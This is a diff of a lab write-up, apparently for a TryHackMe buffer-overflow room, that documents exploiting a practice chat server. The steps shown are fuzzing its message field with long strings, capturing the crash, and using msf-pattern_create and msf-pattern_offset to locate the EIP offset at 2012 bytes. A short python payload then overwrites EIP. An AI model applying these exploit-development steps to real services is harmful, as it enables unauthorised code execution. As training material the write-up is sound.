@@ -148,26 +148,30 @@ mget essfunc.dll [anpqy?]? y
 30761 bytes received in 00:01 (16.23 KiB/s)
 ftp> 
 ```
+# Task 3:
+
+### Q1: Read description of buffer overflow from the THM module 'Buffer Overflows x86-64). 
+Answer: Familiarise with THM buffer overflows module. 
+
+### Q2: After testing for overflow, by entering a large number of characters, determine the EIP offset.
+Answer Task 3 Q2: 2012, see below where EIP determined after basic testing on chatserver. 
+
+There are two variables at start you see when chatserver is running first the user name followed by the message sent.
+
+### First test the user name response:
+
 Initial Test of chatserver
-- Test name limit with 30 characters and message area with long string of A's
+- Test name limit with 30 characters. 
+- Test message area with long string of A's.
 
 Server Side (Windows 8 – chatserver.exe)
-- Server only seemed to accept 24 of the 30 characters sent as name
-- Server failed as soon as i went to 2500 A's, was ok with 1000 A's. 
-```
-C:\Users\Administrator\Desktop\binary\chatserver.exe
+- Server only seemed to accept 24 of the 30 characters sent as name, cutting rest off.
+- Server failed and crashed as soon as I went to 2500 A's, was ok with 1000 A's.
+ 
+I will determine the exact point of failure for message variable but here is the output from these tests as observed.
 
-Chat Server started!
-Called essential function dll version 1.00
-
-Waiting for connections.
-Received a client connection from 192.168.0.167:52332
-Client 192.168.0.167:52332 selected username: THM_USER
-Client 192.168.0.167:52332 closed connection.
-Received a client connection from 192.168.0.167:52326
-Client 192.168.0.167:52326 selected username: AAAAAAAAAAAAAAAAAAAAAAAA
-```
 Client Side (Netcat Terminal – Linux)
+User name of 30 A's, cut off after 24 characters, and message with 1000 A's normal but crashed when 2500 sent.
 ```
 ┌──(hacktopuser㉿hacktop)-[~/Desktop]
 └─$ nc 192.168.0.199 9999
@@ -183,6 +187,17 @@ When 2500 sent automatically crashed no reply
 Write a message:  AAAAAAAAAAAAAA...total of 2000 sent and server crashed here about like in first send.
 ```
 
+Server ok, stopped responding as soon as 2500 A's sent no reply received on client end.
+```
+C:\Users\Administrator\Desktop\binary\chatserver.exe
+
+Chat Server started!
+Called essential function dll version 1.00
+
+Waiting for connections.
+Received a client connection from 192.168.0.167:52326
+Client 192.168.0.167:52326 selected username: AAAAAAAAAAAAAAAAAAAAAAAA
+```
 ### There is a better way to find the EIP
 
 - EIP is the x86 equivalent of rip used with x86-64, its only 4 bytes not 8. Similarly its necessary to overflow into it to replace the return address.
@@ -237,17 +252,20 @@ EIP 31704330
 This is what was used to generate the 3000 characters, resolve EIP location and payload to test it.
 ```                                         
 ...-[~/Desktop]
-└─$ msf-pattern_create -l 3000                                                                  Aa0Aa1Aa2Aa3Aa4Aa5Aa......further in 2012->0Cp1.......0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
-                                                                                                ...-[~/Desktop]
+└─$ msf-pattern_create -l 3000
+Aa0Aa1Aa2Aa3Aa4Aa5Aa......further in 2012->0Cp1.......0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
+
+...-[~/Desktop]
 └─$ msf-pattern_offset -q 31704330
 [*] Exact match at offset 2012
                                             
-┌──(hacktopuser㉿hacktop)-[~/Desktop]
+...-[~/Desktop]
 └─$ python3 -c "print('A'*2012+'B'*4)"     
 AAAAAAAAAA......AAAABBBB
 ```
-This effectively showed EIP replaced wtih 42424242 swith EAX replaced with AAA...
+This effectively showed EIP replaced wtih 42424242 (last 4 B's), with EAX replaced with AAA...
 
+### Q3 Now you know that you can overflow a buffer and potentially control execution, you need to find a function where ASLR/DEP is not enabled. Why not check the DLL file.
 
 
 
